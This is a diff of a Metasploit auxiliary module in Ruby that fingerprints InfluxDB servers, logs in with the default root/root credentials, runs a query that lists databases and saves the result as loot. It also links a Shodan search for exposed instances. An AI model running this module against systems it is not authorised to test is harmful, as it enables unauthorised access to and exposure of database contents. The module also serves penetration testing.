@@ -16,64 +16,85 @@ class MetasploitModule < Msf::Auxiliary
       },
       'References'     =>
         [
-          ['URL', 'http://influxdb.com/docs/v0.9/concepts/reading_and_writing_data.html']
+          ['URL', 'https://docs.influxdata.com/influxdb/'],
+          ['URL', 'https://www.shodan.io/search?query=X-Influxdb-Version']
         ],
-      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],
+      'Author'         =>
+        [
+          'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
+          'Nixawk'
+        ],
       'License'        => MSF_LICENSE
     ))
 
     register_options(
       [
         Opt::RPORT(8086),
-        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/db']),
+        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/']),
         OptString.new('USERNAME', [true, 'The username to login as', 'root']),
-        OptString.new('PASSWORD', [true, 'The password to login with', 'root'])
+        OptString.new('PASSWORD', [true, 'The password to login with', 'root']),
+        OptString.new('QUERY', [true, 'The influxdb query syntax', 'SHOW DATABASES'])
       ])
   end
 
   def run
     begin
+      # Check the target if is a influxdb server
       res = send_request_cgi(
-        'uri'           => normalize_uri(target_uri.path),
-        'method'        => 'GET'
+        'uri'    => normalize_uri(target_uri.path),
+        'method' => 'GET'
       )
-    rescue ::Errno::EPIPE, ::Timeout::Error, ::EOFError, ::IOError => e
-      print_error("The following Error was encountered: #{e.class}")
-      return
-    end
 
-    unless res
-      print_error("Server did not respond in an expected way.")
-      return
-    end
+      return if res.nil?
+      return if res.headers['X-Influxdb-Version'].nil?
 
-    if res.code == 401 && res.body =~ /Invalid username\/password/
-      print_error("Failed to authenticate. Invalid username/password.")
-      return
-    elsif res.code == 200 && res.headers.include?('X-Influxdb-Version') && res.body.length > 0
-      print_status("Enumerating...")
-      begin
-        temp = JSON.parse(res.body)
-        if temp.blank?
-          print_status("Json data is empty")
-          return
+      print_good("#{peer} - Influx Version: #{res.headers['X-Influxdb-Version']}")
+
+      # Send http auth to the target
+      # curl http://127.0.0.1:8086/query?q=SHOW+DATABASES
+      # curl -X POST http://127.0.0.1:8086/query --data 'q=SHOW DATABASES'
+      res = send_request_cgi(
+        'uri'           => normalize_uri(target_uri.path, '/query'),
+        'method'        => 'GET',
+        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'vars_get'      => {
+          'q'           => datastore['QUERY']
+        }
+      )
+
+      return if res.nil?
+      return if res.headers['X-Influxdb-Version'].nil?
+
+      # Check http auth status
+      case res.code
+      when 401
+        fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate. Invalid username/password.")
+      when 200
+
+        begin
+          jsonres = JSON.parse(res.body)
+          return if jsonres.nil?
+          return if jsonres['results'].nil?
+
+          result = JSON.pretty_generate(jsonres)
+          vprint_good("#{peer} - Influx DB Found:\n\n#{result}\n")
+          path = store_loot(
+            'influxdb.enum',
+            'text/plain',
+            rhost,
+            result,
+            'InfluxDB Enum'
+          )
+          print_good("File saved in: #{path}")
+        rescue JSON::ParserError
+          fail_with(Failure::Unknown, "#{peer} - Unexpected response, cannot parse JSON")
         end
-        results = JSON.pretty_generate(temp)
-      rescue JSON::ParserError
-        print_error("Unable to parse JSON data.")
-        return
+
+      else
+        fail_with(Failure::Unknown, "#{peer} - Unexpected response status #{res.code}")
       end
-      print_good("Found:\n\n#{results}\n")
-      path = store_loot(
-        'influxdb.enum',
-        'text/plain',
-        rhost,
-        results,
-        'InfluxDB Enum'
-      )
-      print_good("File saved in: #{path}")
-    else
-      print_error("Unable to enum, received \"#{res.code}\"")
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the influx db server.")
     end
   end
 end
